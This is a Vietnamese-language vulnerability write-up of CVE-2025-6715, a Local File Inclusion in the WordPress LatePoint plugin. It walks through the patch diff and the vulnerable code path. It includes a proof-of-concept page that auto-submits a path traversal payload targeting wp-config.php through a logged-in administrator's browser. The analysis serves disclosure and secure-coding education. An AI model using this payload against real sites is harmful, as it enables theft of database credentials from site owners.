# CVE-2025-6715 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **LatePoint** phiên bản **≤ 5.1.93** chứa lỗ hổng **Local File Inclusion** cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh `include/require`, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.

* **CVE ID**: [CVE-2025-6715](https://www.cve.org/CVERecord?id=CVE-2025-6715)
* **Vulnerability Type**: Local File Inclusion
* **Affected Versions**: <= 5.1.93
* **Patched Versions**: 5.1.94
* **CVSS severity**: High (8.1)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress LatePoint Plugin](https://wordpress.org/plugins/latepoint/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **LatePoint**: **5.1.93** (vulnerable) và **5.1.94** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.

## Analysis

### Patch diff

**Bản lỗi**:

```php { filename="controller.php v5.1.93" hl_lines=[8]}
function render($view, $layout = 'none', $extra_vars = array()){
    $this->vars['route_name'] = $this->route_name;
    extract($extra_vars);
    extract($this->vars);
    ob_start();
    if($layout != 'none'){
      // rendering layout, view variable will be passed and used in layout file
      include LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $this->add_extension($layout, '.php');
    }else{
      include $this->add_extension($view, '.php');
    }
    $response_html = ob_get_clean();
    return $response_html;
}
```

Trong phiên bản lỗi, hàm `render()` gắn `.php` vào `$layout` và `include` trực tiếp mà không kiểm tra, dẫn đến **Local File Inclusion (LFI)** nếu `$layout` bị kiểm soát từ đầu vào.

**Bản vá**:

```php { filename="controller.php v5.1.94" hl_lines=[7,10,21,23,26,29,36,37]}
function render($view, $layout = 'none', $extra_vars = array()){
    $this->vars['route_name'] = $this->route_name;
    extract($extra_vars);
    extract($this->vars);
    ob_start();
    if($layout != 'none'){
		$layout_path = $this->get_safe_layout_path($layout);
      // rendering layout, view variable will be passed and used in layout file
      if($layout_path){
		  include $layout_path;
      }else{
		  __('Invalid layout', 'latepoint');
      }
    }else{
      include $this->add_extension($view, '.php');
    }
    $response_html = ob_get_clean();
    return $response_html;
}

private function get_safe_layout_path($layout) {
    // 1. Remove any path separators and null bytes
    $layout = str_replace(['/', '\\', "\0"], '', $layout);

    // 2. Remove any dots to prevent directory traversal
    $layout = str_replace('.', '', $layout);

    // 3. Only allow alphanumeric, underscore, and hyphen
    $layout = preg_replace('/[^a-zA-Z0-9_-]/', '', $layout);

    // 4. Construct the full path
    $layout_file = $this->add_extension($layout, '.php');
    $full_path = LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $layout_file;

    // 5. Use realpath to resolve any remaining traversal attempts
    $real_path = realpath($full_path);
    $base_path = realpath(LATEPOINT_VIEWS_LAYOUTS_ABSPATH);

    // 6. Ensure the resolved path is within the layouts directory
    if ($real_path && $base_path && strpos($real_path, $base_path) === 0) {
        return $real_path;
    }

    return false;
}
```

Bản vá đã thêm `get_safe_layout_path()` để loại bỏ `/`, `\`, `.` và null byte; chỉ cho phép `[A-Za-z0-9_-]`; xây dựng đường dẫn, dùng `realpath()` và so sánh với `LATEPOINT_VIEWS_LAYOUTS_ABSPATH`. Nếu hợp lệ mới `include`, ngăn chặn LFI.

### Vulnerable Code 

Hàm `render()` được gọi tại **12 vị trí khác nhau**, nên việc **trace thủ công** sẽ rất mất thời gian.

{{< figure src="ref.png" caption="12 vị trí gọi hàm `render()`" >}}

Để tối ưu, ta sử dụng **debugger**:

* Đặt **breakpoint** trong hàm `render()`.
* Thực hiện lần lượt các thao tác trong giao diện (UI).
* Mỗi khi `render()` được gọi, chương trình sẽ **tạm dừng tại breakpoint** và **highlight** dòng code tương ứng, giúp xác định nhanh luồng gọi hàm.

{{< figure src="scr.gif" caption="Video debugger nhảy đến break point" >}}

👉 Khi truy cập endpoint `http://localhost/wp-admin/admin.php?page=latepoint&route_name=calendars__view` với route name là các submenu của plugin thì `render()` được gọi với layout mặc định là `admin`

{{< figure src="default_layout.png" caption="Layout mặc định" >}}

Quan sát callstack, ta thấy được luồng gọi hàm đến `render()`

{{< figure src="callstack.png" caption="Luồng gọi hàm trong callstack" >}}

```php { filename="controller.php v5.1.93" hl_lines=[11]}
function format_render_return($view_name, $extra_vars = array(), $json_return_vars = array(), $from_shared_folder = false){
  $html = '';
  if($this->get_return_format() == 'json'){
    if(is_array($view_name)) $view_name = $view_name['json_view_name'];
    $response_html = $this->render($this->get_view_uri($view_name, $from_shared_folder), 'none', $extra_vars);
    $this->send_json(array_merge(array('status' => LATEPOINT_STATUS_SUCCESS, 'message' => $response_html), $json_return_vars));
  }else{
    if(is_array($view_name)) $view_name = $view_name['html_view_name'];
    $this->extra_css_classes[] = $this->generate_css_class($view_name);
    $this->vars['extra_css_classes'] = $this->extra_css_classes;
    $html = $this->render($this->get_view_uri($view_name, $from_shared_folder), $this->get_layout(), $extra_vars);
  }
  return $html;
}
```

`render()` được `format_render_return()` gọi khi `get_return_format()` không phải là `json`, mặc định nó là `html`

```php
$return_format = 'html'
...
function get_return_format(){
  return $this->return_format;
}
```

`layout` mà ta cần quan tâm là giá trị trả về của `get_layout()` => có `get_layout()` thì cũng sẽ có `set_layout()`, ta tìm với từ khóa `set_layout` trong cùng file để xem giá trị `layout` được set như nào.

```php
$layout = 'admin'
...
function set_layout($layout = 'admin'){
  if(isset($this->params['layout'])){
    $this->layout = $this->params['layout'];
  }else{
    $this->layout = $layout;
  }
}
```

Biến `$layout` được gán giá trị mặc định là **`'admin'`**, tương ứng với layout mà ta đã phân tích trước đó.

Hàm `set_layout()` có nhiệm vụ xác định layout sẽ sử dụng:
* Nếu trong `$this->params` có tồn tại tham số `layout`, thì hàm sẽ dùng giá trị đó.
* Ngược lại, nếu không có, nó sẽ gán layout mặc định (`'admin'`).

Ta tiếp tục tận dụng sức mạnh của **debugger**, quan sát biến `$params`

{{< figure src="params.png" caption="Giá trị của `$params`" >}}

`$params` bao gồm 2 key là `page` và `route_name` tương đương với params string khi ta truy cập endpoint `http://localhost/wp-admin/admin.php?page=latepoint&route_name=calendars__view` 

👉 Như vậy `layout` cũng là param được truyền trong URL, ta tận dụng điều này để khai thác.

Thử truy cập endpoint trên với `layout` param

```http
GET /wp-admin/admin.php?page=latepoint&route_name=calendars__view&layout=payload HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/wp-admin/admin.php?page=latepoint
Connection: keep-alive
Cookie: wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7Cc08cb50e24c24f218212642e90eebec4ec8ab1c3fb72a2443f62f3c27e253edd; wp-settings-time-1=1760795495; language=en; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7C2e46c824d8ba0f581459540ee6553fac38b1af797e42b03957dd3ab2a79a4175
```

`$layout` đã được ta hoàn toàn kiểm soát

{{< figure src="layout.png" caption="`$layout` được kiểm soát" >}}

## Exploit
### Proof of Concept (PoC)

#### Step 1

Tạo trang web có form, tự động gửi request với LFI payload

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form action="http://localhost:80/wp-admin/admin.php" method="get">
        <input type="text" name="page" value="latepoint">
        <input type="text" name="route_name" value="calendars__view">
        <input type="text" name="layout" value="../../../../../../wp-config">
    </form>
    <script>
        document.forms[0].submit()
    </script>
</body>
</html>
```

#### Step 2
Gửi link đến trang web cho admin hoặc người dùng có đặc quyền

**Result**:

Debugger đã nhảy đến `wp-config.php`

{{< figure src="result.png" caption="Kết quả LFI thành công" >}}

> [!INFO]
> Vì đây là CVE được công bố **Unauthenticated**, nên ta tận dụng plugin không check `nonce` để người dùng đã đăng nhập truy cập vào link trang web độc hại rồi tự gửi request đến trang WordPress đó kèm theo cookie. 

### Conclusion

Phiên bản **≤ 5.1.93** của LatePoint cho phép **LFI** vì tham số `layout` không được xác thực trước khi `include()`, dẫn tới khả năng **đọc tệp cục bộ** (ví dụ `wp-config.php`). Lỗ hổng được vá trong **5.1.94** bằng cách lọc ký tự, dùng `realpath()` và giới hạn thư mục hợp lệ.

### Key takeaways

* Đây là **LFI (đọc file)** — không có bằng chứng RCE trong PoC.
* Tham số điều khiển đường dẫn phải được **sanitize + canonicalize** trước khi dùng.
* Dùng **realpath()** và **kiểm tra base dir** để ngăn traversal.
* Không **include** trực tiếp dữ liệu từ request; xây hàm an toàn như `get_safe_layout_path()`.

## References

[File Inclusion/Path traversal — Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols)

[ WordPress LatePoint Plugin <= 5.1.93 is vulnerable to Local File Inclusion ](https://patchstack.com/database/wordpress/plugin/latepoint/vulnerability/wordpress-latepoint-plugin-5-1-94-unauthenticated-lfi-vulnerability)

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-10-19-cve-2025-6715/  

